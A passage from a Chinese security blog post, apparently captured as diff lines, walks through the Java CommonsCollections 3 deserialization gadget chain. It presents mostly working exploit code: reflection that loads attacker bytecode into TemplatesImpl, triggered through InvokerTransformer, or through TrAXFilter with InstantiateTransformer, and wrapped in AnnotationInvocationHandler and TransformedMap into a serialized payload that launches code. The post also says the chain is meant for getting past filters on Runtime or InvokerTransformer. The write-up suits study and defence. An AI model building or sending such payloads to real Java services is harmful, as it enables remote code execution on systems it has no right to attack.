+<p>现在就可以弹出计算器了，如果你这里没有弹出来，看一下import的包是不是有问题，<code>TemplatesImpl</code>和<code>TransformerFactoryImpl</code>的路径一定要是com.xxx，如果是org.xxx是不能用的：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templatesimpl.newTransformer();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>下面我们要想办法执行<code>templatesimpl.newTransformer</code>，这里依旧是用CC1中用到的<code>InvokerTransformer.transform</code>进行代码的执行：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesimpl),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"newTransformer"</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        });</span><br><span class="line">        ctf.transform(<span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>剩下的找<code>Chainedtransformer.transform</code> 的调用点就和CC1后面一样了，直接粘过来就是：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads.Test;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Serialize.serialize;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Unserialize.unserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesimpl),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"newTransformer"</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        });</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,ctf);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相较于CC1来说一个是通过调用Runtime来进行命令执行，一个是通过动态类加载进行代码执行，如果过滤了Runtime我们就可以尝试用这条CC3</p>
+<p>接下来我们在来说ysoserial上用的另一条调用链：</p>
+<p>我们回到<code>newTransformer</code>，刚才说的是用CC1后半段直接调用，我们接着向下找调用<code>newTransformer</code> 的地方，最终锁定在了<code>com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java</code> 这个类上，这个类没有继承serialize接口，也就是说我们没办法通过反射来修改实例中属性的值，但是我们想到对属性值进行初始化的操作一般在构造函数中，我们来看一下它的构造函数：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    {</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以通过这个构造函数来控制这个templates的值，所以下一步就是要找可以调用这个构造函数的地方，ysoserial中给出了<code>InstantiateTransformer</code> 这个类，通过它的构造函数和transform方法可以调用一个对象的指定参数的构造函数：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) {</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="literal">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>也就是说下面两行代码就可以执行newTransformer了：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{templatesimpl});</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最终还是用ChainedTransformer包裹起来执行：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{templatesimpl});</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            instantiateTransformer</span><br><span class="line">        });</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,ctf);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>完整的CC6调用链，当InvokerTransformer被ban时就可以用这条链：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143659042.png"></p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Java反序列化</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/05/30/CommonsCollections-2-4-5-7/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">CommonsCollections 2+4+5+7</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/05/18/CommonsCollections1-6/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CommonsCollections1+6</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
+              appKey: '7gIuYJ9YQk94en6wRudankYd',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'Hi speak something！',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://ycemvr5n.api.lncldglobal.com') {
+              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'y1zh3e7'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC1%E6%89%93%E4%B8%8D%E9%80%9A%E6%97%B6%E7%9A%84%E5%8F%A6%E5%A4%96%E4%B8%80%E6%9D%A1%E9%93%BECC3"><span class="nav-text">CC1打不通时的另外一条链CC3</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">y1zh3e7</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
